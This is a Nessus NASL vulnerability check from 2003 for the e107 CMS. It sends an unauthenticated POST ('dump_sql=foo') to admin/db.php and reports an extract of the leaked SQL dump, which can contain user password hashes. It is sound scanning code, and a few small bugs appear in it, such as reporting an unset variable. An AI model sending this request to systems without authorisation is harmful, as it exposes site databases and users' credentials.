if(description)
{
 script_id(11805);
 script_bugtraq_id(8273);
 script_version("$Revision: 1.1 $");
 name["english"] = "e107 database dump";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running the 'e107' web content management system.

There is a flaw in the file admin/db.php which lets anyone obtain
a dump of the remote SQL database by sending the proper request
to the remote server.

An attacker may use this flaw to obtain the MD5 hashes of the
passwords of the users of this web site.

Solution : None at this time
Risk factor : Serious";

 script_description(english:desc["english"]);
 
 summary["english"] = "e107 flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

data = "dump_sql=foo";

function check(dir)
{
  host = get_host_name();
  req = string("POST ", dir, "/admin/db.php HTTP/1.1\n", "Host: ", host, "\r\n", 
    	 	"Content-Type: application/x-www-form-urlencoded\r\n", 
		"Content-Length: ", strlen(data), "\r\n\r\n", data);

  buf = http_keepalive_send_recv(port:port, data:req);
  if(buf == NULL)exit(0);

  if ("e107 sql-dump" >< buf)
  {
  	data = "The remote host is running the 'e107' web content management system.

There is a flaw in the file admin/db.php which lets anyone obtain
a dump of the remote SQL database by sending the proper request
to the remote server.

An attacker may use this flaw to obtain the MD5 hashes of the
passwords of the users of this web site.

Here is an extract of the dump of the remote database :
"
+ substr(strstr(buf, '\r\n\r\n'), 0, 255) + "

Solution : None at this time
Risk factor : Serious";

   	security_hole(port:port, data:report);
	exit(0);
  }
 
 
 return(0);
}

port = get_kb_item("Services/www");
if(!port)port = 80;

if(!get_port_state(port))exit(0);
foreach dir (make_list("", "/e107", cgi_dirs()))
{
 check(dir:dir);
}
